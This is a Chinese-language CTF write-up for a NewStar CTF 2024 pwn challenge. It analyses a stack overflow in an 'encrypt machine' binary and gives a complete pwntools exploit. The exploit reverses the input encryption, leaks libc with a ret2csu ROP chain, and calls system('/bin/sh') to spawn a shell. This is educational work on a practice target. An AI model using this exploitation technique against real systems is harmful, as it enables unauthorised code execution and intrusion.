---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# My_GBC\!\!\!\!\!

先将程序拖入 IDA 分析

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  initial(argc, argv, envp);
  write(1, "It's an encrypt machine.\nInput something: ", 0x2CuLL);
  len = read(0, buf, 0x500uLL);
  write(1, "Original: ", 0xBuLL);
  write(1, buf, len);
  write(1, "\n", 1uLL);
  encrypt(buf, (unsigned __int8)key, (unsigned int)len);
  write(1, "Encrypted: ", 0xCuLL);
  write(1, buf, len);
  write(1, "\n", 1uLL);
  return 0;
}
```

发现存在一个简单的栈溢出，并且输入的数据经过了某种加密处理，异或后左移

```C
__int64 __fastcall encrypt(__int64 a1, char a2, int a3)
{
  __int64 result; // rax
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i >= a3 )
      break;
    *(_BYTE *)((int)i + a1) ^= a2;
    *(_BYTE *)(a1 + (int)i) = __ROL1__(*(_BYTE *)((int)i + a1), 3);
  }
  return result;
}
```

运行程序后发现，栈溢出时，`rdx` 寄存器值为 1，而程序中能利用的函数 `read` `write` 的三参都是长度，这对我们利用十分不利，因此我们选择 ret2csu

![ret2csu](/assets/images/wp/2024/week2/my-gbc_1.png)

这是 csu 的代码片段，第一段代码能将 `r12` `r13` `r14` 分别 mov 到 `rdi` `rsi` `rdx`，这样我们便能控制 `rdx`，即控制函数的三参，并且后面还有 `call [r15+rbx*8]`，能控制程序的走向；第二段代码则是一长串的 `pop`，配合上述代码，即可达到 ROP，控制程序流程

需要注意的是，`call` 后面有 `add rbx, 1;` `cmp rbp, rbx;` `jnz` ...，我们需要控制 `rbx = 0` `rbp = 1`

对于加密函数，异或和左移都是可逆运算，我们只需对我们输入的内容先右移后异或 `0x5A` 即可

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
def uu64(x): return u64(x.ljust(8, b'\x00'))
def s(x): return p.send(x)
def sa(x, y): return p.sendafter(x, y)
def sl(x): return p.sendline(x)
def sla(x, y): return p.sendlineafter(x, y)
def r(x): return p.recv(x)
def ru(x): return p.recvuntil(x)


k = 1
if k:
    addr = ''
    host = addr.split(':')
    p = remote(host[0], host[1])
else:
    p = process('./My_GBC!!!!!')
elf = ELF('./My_GBC!!!!!')
libc = ELF('./libc.so.6')


def debug():
    gdb.attach(p, 'b *0x401399\nc\n')


def ror(val, n):
    return ((val >> n) | (val << (8 - n))) & 0xFF


def decrypt(data: bytes, key: int):
    decrypted_data = bytearray()
    for byte in data:
        byte = ror(byte, 3)
        byte ^= key
        decrypted_data.append(byte)
    return decrypted_data


def csu_1(arg1, arg2, arg3, func=0, rbx=0, rbp=1):
    r12 = arg1
    r13 = arg2
    r14 = arg3
    r15 = func
    payload = p64(0x4013AA)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    return payload


def csu_2():
    payload = p64(0x401390)
    return payload


add_rsp_8_ret = 0x401016
ret = 0x40101a
payload = b'a' * 0x18 + csu_1(1, elf.got.read, 0x100, elf.got.write) + csu_2()
payload += csu_1(0, 0x404090, 0x50, elf.got.read) + csu_2()
payload += csu_1(0, 0, 0, 0x404098) + csu_2() + p64(ret)
payload += csu_1(0x4040A0, 0, 0, 0x404090) + csu_2()
# debug()
ru(b'Input something:')
s(decrypt(payload, 90))

libc_base = uu64(ru(b'\x7f')[-6:]) - libc.sym.read
success(f"libc_base --> 0x{libc_base:x}")

payload = p64(libc_base + libc.sym.system + 0x0) + p64(add_rsp_8_ret) + b'/bin/sh\x00'
s(payload)

p.interactive()
```
